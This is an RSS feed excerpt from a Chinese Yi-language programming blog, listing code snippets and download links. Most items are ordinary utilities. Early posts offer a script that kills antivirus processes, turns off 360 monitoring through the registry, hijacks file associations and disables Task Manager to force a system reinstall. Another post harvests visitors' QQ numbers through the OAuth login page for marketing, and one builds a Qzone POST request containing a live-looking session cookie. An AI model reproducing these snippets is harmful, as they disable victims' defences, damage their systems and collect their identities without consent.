利用QQ感知登录提取QQ号码</title><link>https://arae.cc/post/25694.html</link><pubDate>Mon, 11 Jul 2016 16:10:12 +0800</pubDate><guid>https://arae.cc/post/25694.html</guid><description>http://openapi.qzone.qq.com/oauth/show?which=ConfirmPage&amp;amp;display=pc&amp;amp;client_id=******* 这里用dz论坛的链接作为例子。识别主要还是后面的ID，其实都无所谓。 无论是读cook还是源码应该都可以读出QQ号的。具体可以做什么，大家自有发挥，不要做坏事哦~ 建议还是用在营销和广告发布上比较好</description></item><item><title>易语言 客户组件post发送数据带所有信息</title><link>https://arae.cc/post/25693.html</link><pubDate>Mon, 11 Jul 2016 16:09:11 +0800</pubDate><guid>https://arae.cc/post/25693.html</guid><description>这样发送可以模拟不同版本的浏览器，红色参数。 最后的两个换行符不要忘记 提交数据 ＝ “content=12345&amp;amp;uin=867400&amp;amp;replycampus=0&amp;amp;property=GoRE” 提交数据长度 ＝ 到文本 (取文本长度 (提交数据)) 内容 ＝ “POST /cgi-bin/new/msgb_addanswer.cgi HTTP/1.1” ＋ #换行符 内容 ＝ 内容 ＋ “Accept: */*” ＋ 内容 ＝ 内容 ＋ “Referer: http://m.qzone.qq.com/” ＋ 内容 ＝ 内容 ＋ “Accept-Language: zh-cn” ＋ 内容 ＝ 内容 ＋ “Content-Type: application/x-www-form-urlencoded” ＋ 内容 ＝ 内容 ＋ “Accept-Encoding: gzip, deflate” ＋ 内容 ＝ 内容 ＋ “User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; 20080914)” ＋ 内容 ＝ 内容 ＋ “Host: m.qzone.qq.com” ＋ 内容 ＝ 内容 ＋ “Content-Length: ” ＋ 提交数据长度 ＋ 内容 ＝ 内容 ＋ “Cache-Control: no-cache” ＋ 内容 ＝ 内容 ＋ “Connection: Keep-Alive” ＋ 内容 ＝ 内容 ＋ “Cookie: pt2gguin=o0000867400; ptcz=3e2483bfdb847715055cad88514a64bfc366de723f25d8d852e0b2611bb934de; pvid=4385960000; uin=o0000867400; skey=@FHM0ith66; r</description></item><item><title>易语言 写注册项恶搞到你重装系统</title><link>https://arae.cc/post/25692.html</link><pubDate>Mon, 11 Jul 2016 16:05:09 +0800</pubDate><guid>https://arae.cc/post/25692.html</guid><description>易语言 写注册项恶搞到你重装系统 运行 (“taskkill /f /im kavsvc.exe”, 假, 1) 运行 (“taskkill /f /im KVXP.kxp”, 假, 1) 运行 (“taskkill /f /im Rav.exe”, 假, 1) 运行 (“taskkill /f /im Ravmon.exe”, 假, 1) 运行 (“taskkill /f /im Mcshield.exe”, 假, 1) 运行 (“taskkill /f /im VsTskMgr.exe”, 假, 1) &#39; 绕过360监控 写注册项 (4, “SOFTWARE\360Safe\safemon\ExecAccess”, 0) 写注册项 (4, “SOFTWARE\360Safe\safemon\MonAccess”, 0) 写注册项 (4, “SOFTWARE\360Safe\safemon\SiteAccess”, 0) 写注册项 (4, “SOFTWARE\360Safe\safemon\UDiskAccess”, 0) 运行 (“taskkill /f /im 360tray.exe”, 假, 1) &#39; 结束360进程 &#39; 修改关联 写注册项 (1, “.txt\”, “jpegfile”) 写注册项 (1, “.inf\”, “jpegfile”) 写注册项 (4, “SOFTWARE\Microsoft\Windows\Curr</description></item><item><title>易语言windows命令合集</title><link>https://arae.cc/post/25668.html</link><pubDate>Mon, 11 Jul 2016 16:00:50 +0800</pubDate><guid>https://arae.cc/post/25668.html</guid><description>绕过杀毒软件防御： 运行 (“taskkill /f /im kavsvc.exe”, 假, 1) 运行 (“taskkill /f /im KVXP.kxp”, 假, 1) 运行 (“taskkill /f /im Rav.exe”, 假, 1) 运行 (“taskkill /f /im Ravmon.exe”, 假, 1) 运行 (“taskkill /f /im Mcshield.exe”, 假, 1) 运行 (“taskkill /f /im VsTskMgr.exe”, 假, 1) 修改系统时间： 置现行时间 (到时间 (“8888年8月8日”)) 禁用任务管理器： 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr”, 0) 禁用注册表： 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\System\Disableregistrytools”, 1) 隐藏开始中的运行 禁止WIN2000/XP通过任务管理器创建新任务： 写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun”,</description></item><item><title>易语言 运行命令之修改文件属性</title><link>https://arae.cc/post/25663.html</link><pubDate>Mon, 11 Jul 2016 15:59:50 +0800</pubDate><guid>https://arae.cc/post/25663.html</guid><description>用到的命令是： attrib 易语言操作命令之全隐藏文件： 运行 (“attrib +a +s +h +r ” ＋ 编辑框_文件路径.内容, 假, ) 易语言操作命令之全显示文件： 运行 (“attrib -a -s -h -r ” ＋ 文件全路径, 假, ) 记录一下各个属性的意思 （1）选用r参数，将指定文件设为只读属性，使得该文件只能读取，无法写入数据或删除；选用—r参数，去除只读属性； （2）选用a参数，将文件设置为档案属性；选用—a参数，去除档案属性； （3）选用h参数，将文件调协为隐含属性；选用—h参数，去隐含属性； （4）选用s参数，将文件设置为系统属性；选用—s参数，去除系统属性； atttib +a +h +r +s E:\Matlab /s /d 后面的/s 和/d的意思是 选用/s参数，对当前目录下的所有子目录及作设置。 选用/d参数，处理 包含文件夹 附上一个运行命令集，参数再说吧 winver 检查Windows版本 wmimgmt.msc 打开Windows管理体系结构(wmi) wupdmgr Windows更新程序 wscript Windows脚本宿主设置 write 写字板 winmsd 系统信息 wiaacmgr 扫描仪和照相机向导 winchat xp自带局域网聊天 mem.exe 显示内存使用情况 msconfig.exe 系统配置实用程序 mplayer2 简易widnows media player mspaint 画图板 mstsc 远程桌面连接 mplayer2 媒体播放机 magnify 放大镜实用程序 mmc 打开控制台 mobsync 同步命令 dxdiag 检查directx信息 drwtsn32 系</description></item><item><title>易语言 组件消息参数详解</title><link>https://arae.cc/post/25662.html</link><pubDate>Mon, 11 Jul 2016 15:54:50 +0800</pubDate><guid>https://arae.cc/post/25662.html</guid><description>将指定信息发送到窗口或窗口组件，并等待且取回信息反馈值。 语法： 整数型 窗口组件．发送信息 （信息值，参数1，参数2） 将指定信息发送到窗口或窗口组件，不等待直接返回。 语法： 无返回值 窗口组件．投递信息 （信息值，参数1，参数2） 移动控件 控件.发送信息 (274, 61458, 0) 控件.发送信息 (161, 2, 0) 调整控件尺寸 调整左边： 控件.发送信息 (274, 61441, 0) 调整右边： 控件.发送信息 (274, 61442, 0) 调整顶边： 控件.发送信息 (274, 61443, 0) 左上角调整： 控件.发送信息 (274, 61444, 0) 右上角调整： 控件.发送信息 (274, 61445, 0) 调整底部： 控件.发送信息 (274, 61446, 0) 左下角调整： 控件.发送信息 (274, 61447, 0) 右下角调整： 控件.发送信息 (274, 61448, 0) 控件最大化 控件.发送信息 (274, 61488, 0) 控件最小化 控件.发送信息 (274, 61473, 0) 鼠标带问号（再次单击问号消失） 发送信息 (274, 61836, 0) 关闭控件 控件.发送信息 (16, 0, 0) 单击鼠标左键 控件.发送信息 (513, 0, 0) 清除窗口标题 控件.发送信息 (12, 0, 0) 复制 编辑框.发送信息 (769, 0, 0) 粘帖 编辑框.发送信息 (770, 0, 0) 全选 编辑框.发送信息 (177, 0, -1) 清空内容 编辑框.发送信息 (12, 1, 0) 按钮单击 发送消息 (发送按钮句柄, 245, 0, 0) 删除 控件.发送信息 (768, 0, 0) 剪切 控件.发送信息 (771, 0, 0) 撤销 控件.发送信息 (772, 0, 0) 退出 控件.发送信息(1,0,0) 获得焦点 控件.发送信息(7,</description></item><item><title>易语言代码统计源码</title><link>https://arae.cc/post/25669.html</link><pubDate>Sun, 10 Jul 2016 15:00:50 +0800</pubDate><guid>https://arae.cc/post/25669.html</guid><description>有事需要统计写了多少代码 这个源码正好可以统计你使用的AIP和多少行代码 链接: http://pan.baidu.com/s/1c2ulmzI 密码: 9j3m 链接: http://pan.baidu.com/s/1dEW28TF 密码: 9p8f</description></item><item><title>二维码生成[易语言源码]</title><link>https://arae.cc/post/25648.html</link><pubDate>Sun, 10 Jul 2016 14:40:50 +0800</pubDate><guid>https://arae.cc/post/25648.html</guid><description>通过调用QRCodeWin32.dll库来实现二维码的编码，点阵建议0.1 二维码用来和app交互很不错。 链接: http://pan.baidu.com/s/1jHADGpC 密码: nakv 链接: http://pan.baidu.com/s/1o7Sg5J0 密码: 9y78</description></item><item><title>非递归算法遍历目录</title><link>https://arae.cc/post/25688.html</link><pubDate>Sat, 25 Jun 2016 14:52:50 +0800</pubDate><guid>https://arae.cc/post/25688.html</guid><description>链接: http://pan.baidu.com/s/1bS4jts 密码: yg6h</description></item><item><title>文本分割例子</title><link>https://arae.cc/post/25659.html</link><pubDate>Sat, 25 Jun 2016 14:48:50 +0800</pubDate><guid>https://arae.cc/post/25659.html</guid><description>链接: http://pan.baidu.com/s/1jIO0dW6 密码: kr2i</description></item><item><title>易语言API时钟的使用方法</title><link>https://arae.cc/post/25667.html</link><pubDate>Sat, 25 Jun 2016 14:46:50 +0800</pubDate><guid>https://arae.cc/post/25667.html</guid><description>子程序： .版本 2 .子程序 _时钟销毁, 逻辑型, 公开, 销毁一个时钟；成功返回真，失败返回假； .参数 窗口句柄, 整数型, , 直接用“取窗口句柄()”命令取出本窗口句柄即可 .参数 时钟标识文本, 整数型, , 创建时用的标识文本 返回 (KillTimer (窗口句柄, 时钟标识文本)) .子程序 _时钟创建, 逻辑型, 公开, 创建一个时钟；成功返回真，失败返回假； .参数 窗口句柄, 整数型, , 直接用“取窗口句柄()”命令取出本窗口句柄即可 .参数 时钟标识文本, 整数型, , 随便输入一些文本，销毁时用来辩认的； .参数 时钟周期, 整数型, , 时钟周期 .参数 时钟_周期事件, 整数型, , 时钟_周期事件 返回 (SetTimer (窗口句柄, 时钟标识文本, 时钟周期, 时钟_周期事件)) DLL定义： .版本 2 .DLL命令 KillTimer, 整数型, &amp;quot;user32&amp;quot;, &amp;quot;KillTimer&amp;quot;, , 中止定时器 .参数 hwnd, 整数型 .参数 nIDEvent, 整数型 .DLL命令 SetTimer, 整数型, &amp;quot;user32&amp;quot;, &amp;quot;SetTimer&amp;quot;, , 安装系统定时器 .参数 hWnd, 整数型 .参数 nIDEvent, 整数型 .参数 uElapse, 整数型 .参数 lpTimerFunc, 整数型</description></item><item><title>易语言取中间文本</title><link>https://arae.cc/post/25671.html</link><pubDate>Sat, 25 Jun 2016 14:45:50 +0800</pubDate><guid>https://arae.cc/post/25671.html</guid><description>码量不是很大直接复制一下吧~ .版本 2 .子程序 取中间文本, 文本型, 公开, 比如：欲取全文本为“12345”,现在要取出“3”，&amp;lt;3&amp;gt;的前面为“2”，&amp;lt;3&amp;gt;的后面为“4”。 .参数 欲取全文本, 文本型, , 比如：欲取全文本为 12345 .参数 前面文本, 文本型, , 3的前面为“2”，引号直接用 #引号，如：&amp;quot;&amp;lt;font color=#引号red#引号&amp;gt;&amp;quot; .参数 后面文本, 文本型, , 3的后面为“4”，引号直接用 #引号，如：&amp;quot;&amp;lt;font color=#引号red#引号&amp;gt;&amp;quot; .参数 起始搜寻位置, 整数型, 可空, 可空。1为首位置，2为第2个位置，如此类推，如果被省略，则“寻找字节集”命令默认从首部开始，“倒找字节集”命令默认从尾部开始。 .参数 是否区分大小写, 逻辑型, 可空, 可空。初始值为“假”。假 = 不区分 真 = 区分大小写。 .局部变量 局_位置, 整数型 .局部变量 局_位置1, 整数型 .局部变量 局_前面文本, 文本型 .局部变量 局_后面文本, 文本型 局_前面文本 ＝ 子文本替换 (前面文本, “#引号”, #引号, , , 真) 局_后面文本 ＝ 子文本替换 (后面文本, “#引号”, #引</description></item><item><title>快速构架超级列表表项(非虚表)</title><link>https://arae.cc/post/25658.html</link><pubDate>Sat, 25 Jun 2016 14:44:33 +0800</pubDate><guid>https://arae.cc/post/25658.html</guid><description>全部都是真实的表项哦~~ 速度比普通添加快很多，如果数据了小于10W还是建议用这个。。 链接: http://pan.baidu.com/s/1bCnhRC 密码: 54qv</description></item><item><title>梦代码编辑框支持库 （2.1#0版）</title><link>https://arae.cc/post/25680.html</link><pubDate>Sat, 25 Jun 2016 14:39:15 +0800</pubDate><guid>https://arae.cc/post/25680.html</guid><description>将 mcse.fne 放到易语言目录的 lib目录中 将 mcse_static.lib 放到易语言目录的 static_lib目录中 感谢mudxni、独孤无情、可爱小浅反馈BUG。 声明：本支持库是完整的移植了火花代码编辑框，在此感谢大色秘密、小刀！ 2.1更新说明： &amp;gt;1.修复了TAB键跳到其它窗口组件。 &amp;gt;2.修复了窗口属性里面的光标颜色和光标闪烁间隔错位。 &amp;gt;3.对代码进行了优化减少了体积。 链接: http://pan.baidu.com/s/1kVfbb0b 密码: z14u</description></item><item><title>四则运算分析计算(非常值得学习嗷)</title><link>https://arae.cc/post/25652.html</link><pubDate>Sat, 25 Jun 2016 14:35:12 +0800</pubDate><guid>https://arae.cc/post/25652.html</guid><description>则运算分析计算可分析括号和负号的呦。 /&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;- 链接: http://pan.baidu.com/s/1gftwx5D 密码: khjt</description></item><item><title>HashMap —— 高效随机存取数据结构 ,文本索引必备</title><link>https://arae.cc/post/25640.html</link><pubDate>Sat, 25 Jun 2016 14:34:32 +0800</pubDate><guid>https://arae.cc/post/25640.html</guid><description>1、此HashMap类采用java jdk中HashMap的实现方式 2、相比论坛上发布过的hashtable之类的源码: &amp;gt;此HashMap寻址方法是拉链法.比开放寻址法对连续内存要求更低 &amp;gt;哈希函数用的是java中String.hashCode()算法(经实际验证其碰撞率极低且相近的文本散列值相邻,存取的效率更高.) &amp;gt;可自动无限增加容量(内存允许) 3、连续10万次不同内容存取效率为，存10万次共耗时约280ms ,取10万次共耗时约330ms 。 （注意：请编译后测试效率，由于大量内存操作，编译后效率约为调试时的100倍以上。） /&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;- 链接: http://pan.baidu.com/s/1qYSVPrY 密码: 7vfs</description></item><item><title>树形框-插入项目，字节集操作</title><link>https://arae.cc/post/25679.html</link><pubDate>Sat, 25 Jun 2016 14:32:50 +0800</pubDate><guid>https://arae.cc/post/25679.html</guid><description>扩展界面支持库的树形框中，有加入项目和删除项目，但是没有插入项目。 于是这个源码诞生了，操作字节集，在指定位置插入一个新项目！ 注意：在实际应用中，应该灵活变通，不要照搬源码！不然数据大的话可能效率低下！这样写只是为了更好的理解树形框项目结构！ /&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash; 链接: http://pan.baidu.com/s/1pKJomnh 密码: uc4a</description></item><item><title>EDB - 易数据库查看器</title><link>https://arae.cc/post/25637.html</link><pubDate>Sat, 25 Jun 2016 14:25:36 +0800</pubDate><guid>https://arae.cc/post/25637.html</guid><description>查看易语言数据库(EDB文件)的源码 可设置文件关联,关联后双击EDB文件直接打开 链接: http://pan.baidu.com/s/1bpzAfYR 密码: 2qtu</description></item><item><title>易语言使用v8引擎(基于UseDotNet)</title><link>https://arae.cc/post/25670.html</link><pubDate>Sat, 25 Jun 2016 14:18:10 +0800</pubDate><guid>https://arae.cc/post/25670.html</guid><description>易语言使用v8引擎(基于UseDotNet) v8.e 中的 V8Engine类 与 Handle类 是由 类库查看器生成的代码 链接: http://pan.baidu.com/s/1o7OFUFg 密码: vi3e</description></item><item><title>易用7z压缩管理软件 1.0 源码（API实现非调用7z命令行）</title><link>https://arae.cc/post/25660.html</link><pubDate>Sat, 25 Jun 2016 14:17:32 +0800</pubDate><guid>https://arae.cc/post/25660.html</guid><description>1、根据论坛老同志开源的7Z核心升级改造后加入GUI界面 2、此代码里面的API是全网最新的，因为本人研究了开发文档，补充了几个API函数，例如打开一个压缩包不需要解压可以直接判断是否加密，压缩密码是否正确等，里面已经附带了开发文档和7z.dll的C++源码 3、里面包含了几个版本的unrar（非rar自带的那个）的DLL调用开发文档和C++源码 4、关于7Z的自解压制作（非调用7z命令行），目前没时间做，过段时间再做，到时候发源码 /&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash; 链接: http://pan.baidu.com/s/1slvdOOt 密码: yzsu</description></item><item><title>图片相似度算法，可识别出缩放，拉伸，亮暗后的同一张图片</title><link>https://arae.cc/post/25653.html</link><pubDate>Sat, 25 Jun 2016 14:17:25 +0800</pubDate><guid>https://arae.cc/post/25653.html</guid><description>通过感知哈希的算法，算出每一张图片的感知哈希值进行对比，如果返回值为0，则表示这两张图片非常相似，如果返回值小于5，则表示有些不同，但比较相近，如果返回值大于10则是完全不同的图片 最大的特点就是快，而且对变形和颜色亮度不敏感 应用范围： 识别出同一张图片的缩略图或者通过缩略图识别出原图， 进行相似图片检索等等 程序依赖：云外归鸟的图像处理支持库 链接: http://pan.baidu.com/s/1o7X3woy 密码: 49pi</description></item><item><title>异常通知辅助模块 5.3 (try/catch)</title><link>https://arae.cc/post/25656.html</link><pubDate>Sat, 25 Jun 2016 14:17:22 +0800</pubDate><guid>https://arae.cc/post/25656.html</guid><description>模块介绍： 该模块功能是补足易错误管理器无法捕捉的异常。 本模块可以截获许多异常,比如内存读写错误,非法汇编指令,算术异常,其他异常等等。 本模块拥有try/catch的异常处理模型，支持多层嵌套，支持向上处理。允许用户自己设定跳过致命异常。 并且支持易原错误管理器接管 建议配合配套工具使用更加好用 模块修改日志： 对未处理的throw_text，提示text 修复：不能取消捕获异常 修复：全局变量类型为X类，X类中的_销毁调用 __DbgName 可能崩溃的问题 强制在非调试状态下使用普通跟踪，在发布版使用劫持跟踪 模块辅助工具更新日志： 1、支持@@skin（跳过）和@@notskin（取消跳过）标记 2、支持记录 程序集/类 名称 3、支持记录 程序/模块 名称 链接: http://pan.baidu.com/s/1nvLAuQd 密码: nyeq</description></item><item><title>易语言5.5版中IDE插件支持库实例</title><link>https://arae.cc/post/25666.html</link><pubDate>Sat, 25 Jun 2016 14:14:14 +0800</pubDate><guid>https://arae.cc/post/25666.html</guid><description>易语言5.5版更新开放了很多IDE接口功能，现在我们能很方便的编写易语言的IDE插件了，而且你也不用担心你只会易语言能不能使用。 下面发的这个代码就是易语言完成的，代码很少很少，应该都能看懂的。 下面来个效果图： 本支持库实现了在易语言IDE输出栏添加一个子夹，并且自动添加易语言运行目录下的ecom模块库文件夹中的模块，当选中指定模块的时候自动添加到模块引用表中（需要已经打开或者新建了易源码程序）。 还未完善，只是一个简单的示例。给大家一个使用IDE接口功能的样板而已。 使用方法：下载源码后，编译出DLL文件，然后将DLL的文件扩展名修改为.fne 然后放入易语言安装目录的 lib 目录中，启动易语言，支持库设置中勾选 洫蜘蛛IDE插件 支持库。 /&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; 链接: http://pan.baidu.com/s/1geCcXxh 密码: em2p</description></item><item><title>易语言汇编rc4算法源码</title><link>https://arae.cc/post/25674.html</link><pubDate>Sat, 25 Jun 2016 14:11:22 +0800</pubDate><guid>https://arae.cc/post/25674.html</guid><description>易语言汇编rc4算法源码例程程序结合易语言数据操作支持库，置入汇编代码实现rc4算法计算。 链接: http://pan.baidu.com/s/1qYvLORE 密码: 5q2n</description></item><item><title>易语言强行兼容高DPI源码</title><link>https://arae.cc/post/25673.html</link><pubDate>Sat, 25 Jun 2016 14:10:25 +0800</pubDate><guid>https://arae.cc/post/25673.html</guid><description>易语言强行兼容高DPI源码例程程序结合易语言模块，调用API函数实现强行兼容屏幕高精度像素效果。 兼容高DPI是个困难的活儿，除非你是用的WPF写界面，其他编程语言都很麻烦（特别是易语言，原生窗体基本别想兼容了。。） 链接: http://pan.baidu.com/s/1czCgzW 密码: n3tb</description></item><item><title>易语言5.5 IDE 全部接口模块 完整插件接口源码</title><link>https://arae.cc/post/25664.html</link><pubDate>Sat, 25 Jun 2016 14:07:45 +0800</pubDate><guid>https://arae.cc/post/25664.html</guid><description>前面的模块吧 编辑-替换指定文本（）的替换参数类型设置错误了应该是 替换参数 不是 参数信息 现在改正了。 下面有个支持库壳有简单的功能，可使用上面模块继续改造添加功能（有易语言工具菜单添加功能） /&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; 链接: http://pan.baidu.com/s/1mhSNK5y 密码: x7kt &amp;lsquo;模块 链接: http://pan.baidu.com/s/1eRXJJ5S 密码: pgwk</description></item><item><title>HP-socket 3.4.3 支持库 (高性能TCP/UDP通讯组件)预支持SSL</title><link>https://arae.cc/post/25644.html</link><pubDate>Sat, 25 Jun 2016 14:04:12 +0800</pubDate><guid>https://arae.cc/post/25644.html</guid><description>易语言的Demo在目录HP-Socket\Demo里面 HPsocket是一款免费的高性能通讯组件，经过本人测试，值得推荐给大家！！！ ( HPsocket的作者很重视易语言用户，对易语言的支持也做到了尽心尽责，不但提供了DLL的支持而且还提供了易语言支持库 ，感动~~~) HP-Socket 是一套通用的高性能 TCP/UDP 通信框架，包含服务端组件、客户端组件和Agent组件，广泛适用于各种不同应用场景的 TCP/UDP 通信系统。HP-Socket 对通信层实现完全封装，应用程序不必关注通信层的任何细节。 为了让使用者能方便快速地学习和使用 HP-Socket ，迅速掌握框架的设计思想和使用方法，特此精心制作了大量 Demo 示例（如：PUSH 模型示例、PULL 模型示例、PACK 模型示例、性能测试示例以及其它编程语言示例）。HP-Socket 目前运行在 Windows 平台，将来会实现跨平台支持。 链接: http://pan.baidu.com/s/1gfHIOnh 密码: 6ysw</description></item></channel></rss>